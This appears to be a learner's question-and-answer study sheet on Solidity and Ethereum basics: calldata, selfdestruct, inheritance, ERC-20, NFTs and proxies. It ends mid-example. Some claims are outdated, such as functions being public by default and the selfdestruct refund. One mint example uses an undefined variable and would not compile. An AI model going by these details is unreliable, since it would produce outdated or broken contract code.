<h2>What are Functions state mutability types?</h2>
<p>Function's State Mutability can be one of four values: </p><p><strong>view</strong>, <strong>pure</strong>, <strong>payable</strong> and <strong>nonpayable</strong>. </p><p></p><p>The last one is the default, it is nonpayable when we don't specify the state mutability.</p>

<h2>What if someone tried to send a payment to a nonpayable function?</h2>
<p>The transaction will fail, sending the ether back to the sender.</p>

<h2>What is the receive function?</h2>
<p>You'll notice that receive does not use the function keyword. This is because it is a special function (like constructor). It is the function that runs when a contract is sent ether without any calldata. <br><br>The <strong>receive</strong> function <strong>must be external</strong>, <strong>payable</strong>, it <strong>cannot receive arguments</strong> and it <strong>cannot return anything</strong>.</p>

<h2>What is this keyword in Contracts?</h2>
<p>In Solidity the <strong>this</strong> keyword give us access to the <strong>contract itself</strong>. We can call functions on it using the . operator <br><br>Within contracts, the this keyword can be explicitly converted to an address: <br><br>console.log( address(this) ); // 0x7c2c195cd6d34b8f845992d380aadb2730bb9c6f <br>console.log( address(this).balance ); // 0</p>

<h2>What is SELFDESTRUCT opcode?</h2>
<p><strong>Contracts can destroy themselves</strong> by using the SELFDESTRUCT opcode on the EVM! <br><br>selfdestruct(payable(msg.sender));</p><p><br>This opcode actually <strong>refunds ether</strong> in order to incentivize folks to clean up the blockchain from unused contracts.</p>

<h2>What does it mean to Revert a Transaction?</h2>
<p>Let's first talk about what it means to revert a transaction. When you revert a transaction, you essentially make it like the transaction never happened. You halt the execution of the transaction and you remove all state changes. The transaction can still be included in a block, and when it is, the transaction sender will still have to pay for the gas used. <br><br>There are 3 ways to express errors in Solidity. They are: <br></p><ul><li><p><strong>assert</strong></p></li><li><p><strong>require</strong></p></li><li><p><strong>revert</strong></p></li></ul><p></p><pre><code>require(someBooleanCondition); 
    require(someBooleanCondition, "Optional error message"); 
    if(!someBooleanCondition) { 
      revert SomeCustomError(errorArg1, errorArg2, ...); 
    }</code></pre>

<h2>What are some example of Calling Contract Addresses from a Contract?</h2>
<pre><code>import "hardhat/console.sol";

    contract A {
        function setValueOnB(address b) external {
            B(b).storeValue(22);
        }
    }
    
    contract B {
        uint x;
    
        function storeValue(uint256 _x) external {
            x = _x;
            console.log(x); // 22
        }
    }
</code></pre>
    <p><br>If you dont have the definition of contract B you can just specify the interface <br></p><pre><code>interface B {
        function storeValue(uint256) external;
    }
    
    contract A {
        function setValueOnB(address b) external {
            B(b).storeValue(22);
        }
    }
</code></pre>

<h2>What Calldata?</h2>
<p>When we want to communicate with a smart contract, we send a transaction from an Externally Owned Account. Inside of that transaction is a data property which is commonly referred to as the <strong>"calldata"</strong>.</p><p></p><p>This call data format is the same for calling solidity functions whether it is in a transaction from an EOA or if its in a message call from one contract to another. <br><br>The format looks a little like this. Let's say you wanted to call a method approve on a contract, that takes a uint:</p><p> </p><pre><code>function approve(uint val) external;</code></pre><p><br>‚òùÔ∏è We can target this function by taking its signature and hashing it with <strong>keccak256</strong>, then taking the first 4 bytes. So for approve here, it would be the keccak256("approve(uint256)"). The first 4 bytes of the resulting hash is <strong>0xb759f954</strong>. This is the first part of our calldata! <br><br>Then we need to decide how much we want to approve. What is our val? Let's say it was 15, that would 0xf in hexadecimal. We will need to pad this value out to 256 bits, or 64 hexadecimal characters. The resulting value will be: <br><br><strong>000000000000000000000000000000000000000000000000000000000000000f</strong></p><p><br>If we combine this with the function signature, our call data would look like this: <br><br><strong>0xb759f954000000000000000000000000000000000000000000000000000000000000000f</strong></p><p><br>Regardless of whether its in a transaction from an EOA or a message call from one contract to another, this would be our calldata sending 15 to an approve function.</p>

<h2>What's Example of calling a Contract function from a Contract manually?</h2>
<pre><code>interface IHero {
    function alert() external;
}

contract Sidekick {
    function sendAlert(address hero) external {
        // TODO: alert the hero using the IHero interface
        IHero(hero).alert();
    }
}</code></pre><p><br>Calling it manually would look like this:</p><p></p><pre><code>contract Sidekick {
    function sendAlert(address hero) external {
        // TODO: fill in the function signature
        bytes4 signature = bytes4(keccak256("alert()"));

        (bool success, ) = hero.call(abi.encodePacked(signature));

        require(success);
    }
}</code></pre><p><br>Shorthand for encoding and signing in one function: </p><p></p><pre><code>bytes memory payload = abi.encodeWithSignature("rumble(uint256,uint256)", 10, 5); (bool success, ) = hero.call(payload);</code></pre>

<h2>What is tx.origin VS msg.sender?</h2>
<p><strong>tx.origin</strong> always refers to the address that initially initiated the transaction and remains constant throughout the transaction chain. </p><p></p><p>On the other hand, <strong>msg. sender</strong> represents the sender of the current message or contract interaction and changes with each call.</p>
<a href="https://dev.to/fassko/understanding-txorigin-and-msgsender-in-solidity-l9o#:~:text=but%20crucial%20purposes.-,tx.,and%20changes%20with%20each%20call." target="_blank" rel="noopener noreferrer">link</a>

<h2>Where can I find Goerli testnet RPC Endpoints?</h2>
<a href="https://www.alchemy.com/chain-connect/chain/goerli" target="_blank" rel="noopener noreferrer">link</a>

<h2>What to use for querying blockchain?</h2>
<p>Use Alchemy Sandbox</p>
<a href="https://dashboard.alchemy.com/sandbox" target="_blank" rel="noopener noreferrer">link</a>

<h2>Where can I find ethers js documentation?</h2>
<a href="https://docs.ethers.org/v6/" target="_blank" rel="noopener noreferrer">link</a>

<h2>Where can I find some good solidity examples?</h2>
<a href="https://solidity-by-example.org/app/deploy-any-contract/" target="_blank" rel="noopener noreferrer">link</a>

<h2>What is a reference type you ask?</h2>
<p>Well, there are two ways in which you can pass an argument to a Solidity function: <br></p><ul><li><p><strong>By value</strong>, which means that the Solidity compiler creates a new copy of the parameter's value and passes it to your function. This allows your function to modify the value without worrying that the value of the initial parameter gets changed. </p></li><li><p><strong>By reference</strong>, which means that your function is called with a... reference to the original variable. Thus, if your function changes the value of the variable it receives, <strong>the value of the original variable gets changed</strong>.</p></li></ul>
<a href="https://cryptozombies.io/en/lesson/1/chapter/7" target="_blank" rel="noopener noreferrer">link</a>

<h2>What visibility type are function by default in Solidity?</h2>
<p>In Solidity, <strong>functions are public by default</strong>. This means <strong>anyone (or any other contract) can call</strong> your contract's function and execute its code. <br><br>Obviously this isn't always desirable, and can make your contract vulnerable to attacks. </p><p></p><p>Thus it's good practice to mark your functions as private by default, and then only make public the functions you want to expose to the world. <br><br>It's convention to <strong>start private function names with an underscore (_)</strong>.</p>

<h2>What are Events?</h2>
<p><strong>Events</strong> are a way for your contract to<strong> communicate that something happened on the blockchain</strong> to your app front-end, which can be 'listening' for certain events and take action when they happen.</p>
<a href="https://cryptozombies.io/en/lesson/1/chapter/13" target="_blank" rel="noopener noreferrer">link</a>

<h2>What are the two types of Memory in Solidity?</h2>
<p>In Solidity, there are two locations you can store variables ‚Äî in <strong>storage</strong> and in <strong>memory</strong>. <br><br><strong>Storage</strong> refers to variables stored <strong>permanently</strong> on the blockchain. </p><p></p><p><strong>Memory</strong> variables are <strong>temporary</strong>, and are erased between external function calls to your contract. Think of it like your computer's hard disk vs RAM. <br><br>State variables (variables declared outside of functions) are by default storage and written permanently to the blockchain, while variables declared inside functions are memory and will disappear when the function call ends. <br></p>
<a href="https://cryptozombies.io/en/lesson/2/chapter/7" target="_blank" rel="noopener noreferrer">link</a>

<h2>How to Interact With a Smart Contract from Another Smart Contract?</h2>
<p>For our contract to talk to another contract on the blockchain that we don't own, first we need to <strong>define an interface</strong>. <br><br>By including this interface in our dapp's code our contract knows what the other contract's functions look like, how to call them, and what sort of response to expect.</p>
<a href="https://cryptozombies.io/en/lesson/2/chapter/10" target="_blank" rel="noopener noreferrer">link</a>

<h2>What are Hash Tables?</h2>
<p>A <strong>Hash Table</strong> is a data structure that implements an <strong>Associative Array</strong> (also referred to as a "<strong>Dictionary</strong>"). </p><p></p><p>In an associative array, data is stored as a collection of key-value pairs. The <strong>position</strong> of the data within the array is <strong>determined by</strong> applying a <strong>hashing algorithm to the key</strong>. <br><br>Hash Table Data Structures Are Efficient üèé </p><p><br>Hash tables enable very efficient searching, in fact, they enable the "holy grail" <strong>O(1) search time</strong>. </p><p></p><p>Hash tables do not require a brute force search or a for loop to lookup a value thanks to the deterministic nature of hash functions! üêê </p><p></p><p>You can just say, gimme whatever value is held at this key and the hash table data structure will comply. ‚ö°Ô∏è</p>
<a href="https://university.alchemy.com/course/ethereum/md/63a36099f7a1fd00046c80d0" target="_blank" rel="noopener noreferrer">link</a>

<h2>What are Mappings in Solidity?</h2>
<p>In Solidity, <strong>hash tables are called mappings</strong>. They function pretty much the exact same as hash tables. ü§∑ <br><br>Mappings act as hash tables which consist of <strong>key types</strong> and corresponding <strong>value type pairs</strong>. <br><br>Solidity mappings are particularly useful for address association. <br><br>Thanks to mappings, you can associate an Ethereum address to a specific value. <br><br>Solidity lets you do so via a nested mapping, which are declared exactly the same as regular mapping but nested. <br><br>Mappings are super useful data structures in Solidity. Developers are able to keep track of records in an organized and efficient manner. </p><p></p><p>Address association is particularly powerful, since developers can now code in specific record-keeping around any Ethereum address.</p>

<h2>What's an Escrow?</h2>
<p>An escrow is an agreement often used when <strong>transferring funds</strong> in exchange <strong>for</strong> a <strong>good</strong> or <strong>service</strong>. Funds can be held in escrow and a third party can be chosen to "arbitrate" or approve the transfer when the service or good is provided. <br><br>There are many use cases for Escrows across <strong>real estate</strong>, <strong>charities</strong> and <strong>marketplaces</strong>. It's the bread and butter of Ethereum Smart Contracts as it's quite easy to write, and yet, so powerful. üçûüßà <br><br>üôÇ <strong>Depositor</strong> - The payer of the Escrow, makes the <strong>initial deposit </strong>that will eventually go to the beneficiary. <br>üë®‚Äçüîß <strong>Beneficiary</strong> - The receiver of the funds. They will <strong>provide</strong> some <strong>service</strong> or <strong>good</strong> to the depositor before the funds are transferred by the arbiter. <br>üë©‚Äç‚öñÔ∏è <strong>Arbiter</strong> - The <strong>approver</strong> of the transaction. They alone can move the funds when the goods/services have been provided.</p>

<h2>What are Solidity Types?</h2>
<p>At this point, you are well on your way to becoming a Solidity master. We've looked at the primitive data types in Solidity, such as:</p><p></p><ul><li><p><strong>uint/int</strong></p></li><li><p><strong>boolean</strong></p></li><li><p><strong>address</strong></p></li><li><p><strong>enum</strong></p></li><li><p><strong>bytes </strong></p></li></ul><p></p><p>Primitive data types can also be referred to as "<strong>value types</strong>". A value type stores its data <strong>directly</strong> in the variable. <br><br>Solidity, like most other object-oriented programming languages, has another type of data for <strong>reference-based</strong> data types, such as:</p><p></p><ul><li><p><strong>arrays</strong></p></li><li><p><strong>strings</strong></p></li><li><p><strong>structs</strong></p></li><li><p><strong>mappings</strong></p></li></ul><p></p><p>A reference type <strong>does not store values directly</strong> in a variable. Instead, reference types <strong>hold a pointer to the address of the data's location</strong>.</p>

<h2>What you should be careful about while using Arrays in Solidity?</h2>
<p><strong>‚ö†Ô∏è Be careful with iterating arrays</strong>, as that can be costly to your smart contract users! </p><p></p><p>Array iteration is not a recommended pattern for smart contract developers.</p>

<h2>What's a great solidity security page?</h2>
<a href="https://github.com/sigp/solidity-security-blog?tab=readme-ov-file#unchecked-calls" target="_blank" rel="noopener noreferrer">link</a>

<h2>Whats a good book for understanding Ethereum?</h2>
<p>Mastering Ethereum</p>
<a href="https://github.com/ethereumbook/ethereumbook/tree/develop" target="_blank" rel="noopener noreferrer">link</a>

<h2>What aere 30 Solidity Tricks You Can‚Äôt Live Without?</h2>
<a href="https://www.youtube.com/watch?v=2WHy9IotKt4" target="_blank" rel="noopener noreferrer"></a>

<h2>How to send Ether and Calldata to Particular Address?</h2>
<p>To send ether and calldata to a particular address, we can use the following syntax: <br></p><pre><code>_tx.destination.call{ value: _tx.value }(_tx.data);</code></pre><p><br>How does this work? ü§î <br><br>There's three types being used here in this syntax:</p><p></p><ul><li><p><strong>_tx.destination</strong> - an address that we're sending data and ether to</p></li><li><p><strong>_tx.value</strong> - a uint that represents the amount of ether we are sending to the destination. This could be zero. If it's above zero, the multisig must have enough ether stored in it to send this amount.</p></li><li><p><strong>_tx.data</strong> - this can be empty, although often this is abi encoded function signature and arguments. If the destination is a smart contract, it will run some code based on this calldata! </p></li></ul><p></p><p>üí° The call data can be basically anything! A simple example would be an encoded call to transfer(address _to, uint256 _value) on an ERC20 token</p>
<a href="https://university.alchemy.com/course/ethereum/sc/63b5cb99f4fc56cceb80ca4c/stage/63b5cb99f4fc56cceb80ca74" target="_blank" rel="noopener noreferrer">link</a>

<h2>What's Inheritance in Solidity?</h2>
<p>Inheritance means that you can create an object with some values/methods and use it as a base for other objects. <br><br>In Solidity, the objects we're referring to are <strong>contracts</strong> and <strong>interfaces</strong>. </p><p></p><p>We can write a contract with state variables and functions. Then we can create contracts that <strong>inherit those variables and functions</strong>. These derived contracts can then choose to add behavior as necessary. <br><br>Smart contracts can inherit other contract by using the <strong>is</strong> keyword. More specifically, a contract that inherits is the child and the inheritor is the parent. Using the is keyword in Solidity establishes a smart contract parent-to-child chain. So whenever you think of inheritance, just think of the infamous father-son duo: Draco and Lucius Malfoy! <br><br>All inheritance does is LITERALLY <strong>copy-paste the code of the parent contract into the child contract</strong>. That's it!</p>
<a href="https://university.alchemy.com/course/ethereum/md/63b72e418ab8df0004b91332" target="_blank" rel="noopener noreferrer">link</a>

<h2>What are different Types of Inheritance in Solidity?</h2>
<p><strong>Single inheritance</strong> helps in inheriting the variables, functions, modifiers, and events of base contracts into the derived contract. </p><p></p><pre><code>Contract A { ... } 
    Contract B is A { ... } </code></pre><p></p><p><strong>Multi-level inheritance</strong> is very similar to single inheritance; however, instead of just a single parent-child relationship, there are multiple levels of parent-child relationships. This is what is referred to as a smart contract inheritance chain. In this case, Contract A is the base contract as it is the contract all other contracts inherit from. <br></p><pre><code>Contract A { ... } 
    Contract B is A { ... } 
    Contract C is B { ... } </code></pre><p><br><strong>Hierarchical inheritance</strong> is again similar to simple inheritance. Here, however, a single contract acts as a base contract for multiple derived contracts. Contract B and Contract C, in this case, act as siblings but are not interconnected in any way other than that.</p><p></p><pre><code>Contract A { ... } 
    Contract B is A { ... } 
    Contract C is A { ... } </code></pre>
<a href="https://university.alchemy.com/course/ethereum/md/63b72e418ab8df0004b91332" target="_blank" rel="noopener noreferrer">link</a>

<h2>Why is Inheritance useful?</h2>
<p>Smart contract inheritance is very useful because it allows us to bring in existing code, variables and functions into any contract we write; all we need to do is use the is keyword. <br><br>Inheritance is a <strong>great way to follow the DRY</strong> (Don't Repeat Yourself) <strong>principle</strong> of software development! üíØ</p>

<h2>What is OpenZeppelin?</h2>
<p>Have you heard of <strong>OpenZeppelin</strong> before? They are a company that produces industry-standard smart contracts. This means they develop and deploy smart contracts that are <strong>so used</strong>, <strong>audited</strong> and s<strong>tress-tested</strong> that they become <strong>industry standards</strong>. <br><br>Writing from scratch is not bad! But you should know when to <strong>rely on battle-tested code</strong> and when to write your own. üõ°</p> 

<h2>How to use Multiple Inheritance in Solidity?</h2>
<pre><code>contract Token {
    mapping(address =&gt; uint) balances;
}

contract Ownable {
    address owner;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
}

contract MyToken is Token, Ownable {
    function mint(uint _amount) public onlyOwner {
        balances[msg.sender] += amount;
    }
}</code></pre>

<h2>What the Solidity Inheritance - Function Syntax?</h2>
<p><strong>virtual</strong> Keyword <br>A function that is going to be <strong>overriden by a child contract</strong> must be declared as virtual:</p><p></p><pre><code>function foo() public pure virtual returns (uint) {
    return 10;
}</code></pre><p><br><strong>override</strong> Keyword <br>A function that is going to <strong>override a parent function</strong> must use the keyword override:</p><p></p><pre><code>function foo() public pure override returns (uint) {
    return 15;
}</code></pre><p></p><p>‚ö†Ô∏è The overriding function must have the <strong>same visibility</strong> as the virtual function. If not the compiler will throw a TypeError: "Overriding function visibility differs". Keep en eye out for that one!</p>

<h2>What's a ERC-20 token?</h2>
<p>An ERC-20 token is a <strong>representation of some sort of asset</strong> on the Ethereum network. These could be anything:</p><p></p><ul><li><p><strong>shares in a company</strong></p></li><li><p><strong>reward system points</strong></p></li><li><p><strong>voting rights</strong></p></li><li><p><strong>cryptocurrency</strong></p></li><li><p><strong>lottery tickets</strong></p></li><li><p><strong>on-chain Chuck E Cheese tokens</strong></p></li><li><p><strong>anything you can think of!</strong></p></li></ul><p></p><p>This is what has made Ethereum a popular choice for many different use cases across industries - anyone can tokenize any asset. <br><br>A key point to understand here is that <strong>ERC-20 is a technical standard</strong>! üí° <br><br>The main use of the ERC-20 standard is to <strong>increase compatibility of the ecosystem</strong>. <br><br>At the base level, an ERC-20 token smart contract <strong>simply uses a mapping to keep track of fungible tokens</strong>: any one token is exactly equal to any other token; <strong>no tokens have special rights or behavior associated with them</strong>.</p>
<a href="https://university.alchemy.com/course/ethereum/md/63b89b9806da6e0004b1eb4b" target="_blank" rel="noopener noreferrer">link</a>

<h2>What must ERC-20 compliant token contract provide and how does the ERC-20 interface look like in Solidity?</h2>
<p>An ERC-20-compliant token contract must provide at least the following: </p><p></p><ul><li><p><strong>name</strong>, <strong>symbol</strong>, and decimals are all optional fields </p></li><li><p><strong>totalSupply</strong> defines the current circulating supply of the tokens </p></li><li><p><strong>balanceOf</strong> will return the balance for a particular user </p></li><li><p><strong>transfer</strong> which is the bread and butter, transfer from one account to another </p></li><li><p><strong>approve</strong>, <strong>transferFrom</strong> and <strong>allowance</strong> are methods for other contracts moving your funds </p></li></ul><p></p>

<pre><code>pragma solidity 0.8.4;

    interface IERC20 {
        function totalSupply() external view returns (uint256);
        function balanceOf(address account) external view returns (uint256);
        function allowance(
            address owner,
            address spender
        ) external view returns (uint256);
    
        function transfer(
            address recipient,
            uint256 amount
        ) external returns (bool);
        function approve(address spender, uint256 amount) external returns (bool);
        function transferFrom(
            address sender,
            address recipient,
            uint256 amount
        ) external returns (bool);
    
        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(
            address indexed owner,
            address indexed spender,
            uint256 value
        );
    }
</code></pre>

<h2>What's the balances and allowances data structures in ERC-20?</h2>
<p>There are two important data structures used by the ERC-20 token standard that we should review: <br><br><strong>balances</strong> - mapping of token balances, by owner. </p><p></p><p><strong>transfer</strong> - is a deduction from one balance and an addition to another balance. </p><p><br><strong>allowances</strong> - mapping of allowances/delegate spending. This is a nested mapping in which the primary key is the address of the token owner which maps to a spender address and amount delegated to spend. </p>

<h2>What are Tokens?</h2>
<p>You can think of <strong>tokens like dollars</strong> (or any other type of asset). Tokens can be given to other people, they can be lent to other people via allowances, and you can see how many tokens someone owns. <br><br>Each ERC20 token <strong>has its own supply</strong> which is the<strong> total number of the tokens that are in circulation</strong>. Tokens can be minted to addresses in any number of creative ways. The majority of the time they are minted to a single address and transferred to a crowdsale contract.</p>

<h2>What is Minting?</h2>
<p>üìñ The term <strong>mint</strong> here is used to describe the<strong> creation of a new token</strong>.</p><p></p><p>It was traditionally used to describe<strong> the creation of new coins</strong>. The origins of this word are quite old, according to Wikipedia, it is originally attributed to 269 BC! üèõÔ∏è</p>

<h2>How old is Solidity?</h2>
<p>Proposed in 2014, Solidity is an object-oriented, high-level programming language for implementing smart contracts that run on the Ethereum Virtual Machine (EVM) <br><br>It was first developed by <strong>Gavin Wood in 2014</strong> and released in 2015. Since then, the language has become one of the most popular and widely used programming languages for developing blockchain-based applications.</p>

<h2>What are Events good for in ERC-20 Token?</h2>
<p>Events give external applications a way to "<strong>listen in</strong>" on the <strong>happenings inside of the EVM</strong>. Events can essentially act as hooks for an application to perform some action. <br><br>An example of a UI listening for changes to our ERC20 Token might be a Decentralized Exchange. It's waiting to see a transfer to or from your account to update your balance. It could <strong>subscribe</strong> to events on an Ethereum node and then <strong>broadcast</strong> any changes to the web interface where your balance is displayed.</p>

<h2>What's an API key?</h2>
<p>üìñ An <strong>API key is a unique identifier</strong> that grants<strong> access to an API </strong>(Application Programming Interface). It acts as a secret token that allows the user to gain access to a set of methods.</p>

<h2>What are Topics?</h2>
<p><strong>Topics</strong> are used to <strong>categorize the logs</strong> to search for specific events! </p><p></p><p>But, what are topics, exactly? Topics are <strong>32-byte hash values </strong>that represent a <strong>specific piece of information</strong> related to the event being logged. </p><p></p><p>For example, if a smart contract logs an event every time a user makes a purchase, one topic might represent the user's address, while another topic might represent the product that was purchased.</p>

<h2>What's The Alchemy Transfers API?</h2>
<p><strong>The Alchemy Transfers API</strong> is a powerful tool that makes it easy for developers to <strong>fetch historical transaction data</strong> for any address. </p><p></p><p>It's a <strong>fast</strong> and <strong>efficient</strong> alternative to scanning the entire blockchain, so you can focus on building great user experiences without having to worry about the technical details.</p>

<h2>What are NFTs?</h2>
<p>The acronym <strong>NFT</strong> stands for <strong>Non-Fungible Token</strong>. All this means it is a token that has unique characteristics. </p><p></p><p>Today most people associate NFTs with <strong>digital art ownership</strong>. People are generally aware of some of the more well known NFT collections like <strong>Crypto Punks</strong> or<strong> Bored Apes</strong>. </p><p></p><p>They <strong>represent digital ownership of some unique good on the blockchain</strong>. </p><p></p><p>There are many different token <strong>standards</strong> for NFTs. The two most common are <strong>ERC721</strong> and <strong>ERC1155</strong> (curious about the difference? Check out this blog article). </p><p></p><p>Unlike <strong>ERC20s</strong>, <strong>NFTs</strong> will often <strong>store some of their data off-chain</strong>. This surprises many people the first time they hear it, but it should make sense given what we know about blockchains from this course! </p><p></p><p>It's quite expensive to store one uint256 in Ethereum, can you imagine if you were trying to store a 5mb image? The data that is <strong>stored off-chain</strong> is often referred to as <strong>metadata</strong> and there is an emerging standard for how metadata should be structured.</p>

<h2>What's IPFS?</h2>
When you ask IPFS for an image, you provide IPFS with a hash and it goes and finds someone on the network who is serving that hash. If the file contents retrieved don't match the hash you requested, it is discarded out by the protocol.

When you look up a resource on IPFS you provide the hash in your query, so you are essentially telling IPFS what you're looking for. This is as opposed to looking up a resource on the internet. On the internet, you provide a URL, which tells the browser where to go to find your resource. This doesn't necessarily mean that your image will always be available, but there is a significant benefit here. 

Anyone who is serving your image on the peer-to-peer IPFS network will be able to fulfill your request to render your image. If everyone else on the network stops serving your image, you can do so yourself and your IPFS reference will still resolve.   

<h2>100 Solidity Job Interview Questions & Answer | Blockchain Interview Q&A ?</h2>
<a href="https://www.youtube.com/watch?v=FoCM07HlfhU" target="_blank" rel="noopener noreferrer">link</a>

<h2>How to Audit a Smart Contract </h2>
<a href="https://www.youtube.com/watch?v=TmZ8gH-toX0" target="_blank" rel="noopener noreferrer">link</a>

<h2>What's a good news of crypto hacks?</h2>
<a href="https://rekt.news/" target="_blank" rel="noopener noreferrer">link</a>

<h2>Beginner Roadmap to Smart Contract Auditing</h2>
<a href="https://www.youtube.com/watch?v=-469Gcye-ZE" target="_blank" rel="noopener noreferrer">link</a>

<h2>What are Libraries?</h2>
<p>Libraries are like contracts, but with some key differences! When you deploy a library on its own, you cannot store storage variables on libraries and you can't send ether to them either. When you need to share code between Solidity Contracts, it's time to utilize Libraries. </p><p></p><p>Libraries are a great place to store functions that are common to many Smart Contracts. These functions can range from re-usable math functions to contract patterns and permissions. </p><p></p><p>Using libraries can:</p><p>- Reduce new code, limiting the opportunity for bugs üêõ </p><p>- Save development time by not re-inventing the wheel üë®‚Äçüíªüë©‚Äçüíª </p><p>- Secure your contracts with audited code and best practices üîí </p><p>- *Save gas on deployments by making use of already deployed code ‚õΩ </p><p></p><p>Two ways to use them: </p><p>1. Deployed Inline When all the functions you are using from a library function are marked as internal, they will be pulled directly into the smart contract bytecode by the solidity compiler. These functions are being pulled inline with the contract and deployed together. You'll see this is the case for the majority of libraries used today. </p><p>2. Deployed Separately Deploying a library separately from your smart contract can be helpful in that it can help keep your smart contract below the 24kb limit, and also you can potentially share an on-chain library with other contracts, which can help ease your deployment burden. The library can run code on behalf of a contract, much like a logic contract in our proxy/logic discussions. This is because when we call an external function on a library, a delegatecall will be made.</p>
<a href="https://university.alchemy.com/course/ethereum/md/63bf7bc8fb88d90004684f91" target="_blank" rel="noopener noreferrer">link</a>

<h2>What's The Block Global Property?</h2>
<p>Among many global properties we can access inside Solidity is the block. The block will tell us information about the current block this transaction is being mined on:</p><p></p><ul><li><p><strong>block.coinbase</strong> - The <strong>miner</strong> of this block's address ‚õèÔ∏è</p></li><li><p><strong>block.difficulty</strong> - The <strong>difficulty</strong> of the current block üòì</p></li><li><p><strong>block.gaslimit</strong> - The total <strong>gaslimit</strong> of the block ‚õΩ</p></li><li><p><strong>block.number</strong> - The current <strong>block number </strong>1Ô∏è‚É£</p></li><li><p><strong>block.timestamp</strong> - The current <strong>timestamp</strong> of the block (in seconds since unix epoch) üïí</p></li></ul><p></p><p>‚òùÔ∏è All of these are <strong>256 bit unsigned integers </strong>with the exception of coinbase which is an address.</p>

<h2>How Do Upgradeable Smart Contracts Work?</h2>
<p>Upgradeable smart contracts are a pattern composed of <strong>THREE contracts</strong>:</p><p></p><ol><li><p><strong>Proxy contract</strong>: The smart contract the user interacts with directly.</p><ul><li><p>This contracts holds the <strong>contract state</strong> (ie, the important data is held here!).</p></li><li><p>This is an <a target="_blank" rel="noopener noreferrer nofollow" class="chakra-link css-181sfzb" href="https://eips.ethereum.org/EIPS/eip-1967">EIP1967 standard</a> proxy contract.</p></li><li><p>This proxy contract is in charge of f<strong>orwarding transactions</strong> to the <em>implementation</em> contract, the one containing the pure logic.</p></li></ul></li><li><p><strong>Implementation contract</strong>: The smart contract that provides the skeleton logic and data.</p><ul><li><p>This is where you instantiate your variables. Your proxy contract, via delegatecalls into this one, will give them value!</p></li></ul></li><li><p><strong>ProxyAdmin contrac</strong>t: The contract links <code>Proxy</code> and <code>Implementation</code>.</p><ul><li><p>This contract holds authority over <code>Proxy</code> to upgrade the Proxy contract and thus link that proxy to a new implementation contract.</p></li></ul></li></ol>
<a href="https://university.alchemy.com/course/ethereum/md/63bfe284016d9c000492215d" target="_blank" rel="noopener noreferrer">link</a>

<h2>How to Interact with a Smart Contract (FROM SCRATCH!) - Alchemy University</h2>
<a href="https://www.youtube.com/watch?v=tpGbvmp_OXY" target="_blank" rel="noopener noreferrer">link</a>

<h2>Ethereum Developer Tools List</h2>
<h2>New developers start here</h2><ul><li><p><a target="_blank" rel="nofollow" href="https://soliditylang.org/">Solidity</a> - The most popular smart contract language.</p></li><li><p><a target="_blank" rel="nofollow" href="https://metamask.io/">Metamask</a> - Browser extension wallet to interact with Dapps.</p></li><li><p><a target="_blank" rel="nofollow" href="https://trufflesuite.com/">Truffle</a> - Most popular smart contract development, testing, and deployment framework. Install the cli via npm and start here to write your first smart contracts.</p></li><li><p><a target="_blank" rel="nofollow" href="https://trufflesuite.com/boxes">Truffle boxes</a> - Packaged components for the Ethereum ecosystem.</p></li><li><p><a target="_blank" rel="nofollow" href="https://hardhat.org/">Hardhat</a> - Flexible, extensible and fast Ethereum development environment.</p></li><li><p><a target="_blank" rel="nofollow" href="https://book.getfoundry.sh/">Foundry</a> - Smart contract development toolchain. Foundry manages your dependencies, compiles your project, runs tests, deploys, and lets you interact with the chain from the command-line.</p></li><li><p><a target="_blank" rel="nofollow" href="https://cryptotux.org/">Cryptotux</a> - A Linux image ready to be imported in VirtualBox that includes the development tools mentioned above</p></li><li><p><a target="_blank" rel="nofollow" href="https://docs.openzeppelin.com/contracts/5.x/wizard">OpenZeppelin Wizards</a> - Not sure where to start? Use the interactive generator to bootstrap your contract and learn about the components offered in OpenZeppelin Contracts.</p></li><li><p><a target="_blank" rel="noopener noreferrer nofollow" href="http://EthHub.io">EthHub.io</a> - Comprehensive crowdsourced overview of Ethereum- its history, governance, future plans and development resources.</p></li><li><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://github.com/iamdefinitelyahuman/brownie">Brownie</a> - Brownie is a Python framework for deploying, testing and interacting with Ethereum smart contracts.</p></li><li><p><a target="_blank" rel="nofollow" href="https://moralis.io/">Moralis</a> - Moralis is a cross-chain Enterprise-grade Web3 API that can be used for efficiently indexing blockchain data, authenticate various web3 wallets, and listen to real-time blockchain events</p></li><li><p><a target="_blank" rel="nofollow" href="https://ethereum.stackexchange.com/">Ethereum Stack Exchange</a> - Post and search questions to help your development life cycle.</p></li><li><p><a target="_blank" rel="nofollow" href="https://dfuse.io/">dfuse</a> - Slick blockchain APIs to build world-class applications.</p></li><li><p><a target="_blank" rel="nofollow" href="https://biconomy.io/">Biconomy</a> - Do gasless transactions in your dapp by enabling meta-transactions using simple to use SDK.</p></li><li><p><a target="_blank" rel="nofollow" href="https://blocknative.com/">Blocknative</a> ‚Äî Blockchain events before they happen. Blocknative's portfolio of developers tools make it easy to build with mempool data.</p></li><li><p><a target="_blank" rel="noopener noreferrer nofollow" href="http://useWeb3.xyz">useWeb3.xyz</a> ‚Äî A curated overview of the best and latest resources on Ethereum, blockchain and Web3 development.</p></li><li><p><a target="_blank" rel="nofollow" href="https://geth.ethereum.org/">Geth</a> ‚Äî An ethereum development client based in Go.</p></li><li><p><a target="_blank" rel="nofollow" href="https://cryptozombies.io/">CryptoZombies</a> ‚Äî An interactive code school that teaches you to write smart contracts in Solidity.</p></li><li><p><a target="_blank" rel="nofollow" href="https://www.smartcontract.engineer/">Smartcontract challenges</a> ‚Äî Learn Solidity and Vyper with challenges.</p></li><li><p><a target="_blank" rel="nofollow" href="https://solidity-by-example.org/">Solidity by Example</a> ‚Äî An introduction to Solidity with simple examples.</p></li><li><p><a target="_blank" rel="nofollow" href="https://l2beat.com/">L2Beat</a> - Discover Ethereum Layer2 solutions and the risks associated with using them.</p></li><li><p><a target="_blank" rel="nofollow" href="https://tatum.io/">Tatum</a> - The blockchain development tool that streamlines the development of blockchain applications.</p></li></ul>
<a href="https://github.com/Consensys/ethereum-developer-tools-list" target="_blank" rel="noopener noreferrer">link</a>

<h2>What's the Modifiers syntax?</h2>
<p>Function <strong>Modifiers</strong> are used to <strong>modify the behaviour of a function</strong>. For example to add a <strong>prerequisite</strong> to a function.</p><p>First we create a modifier with or without parameter.</p><p></p><pre><code>contract Owner {
    modifier onlyOwner {
       require(msg.sender == owner);
       _;
    }
 
    modifier costs(uint price) {
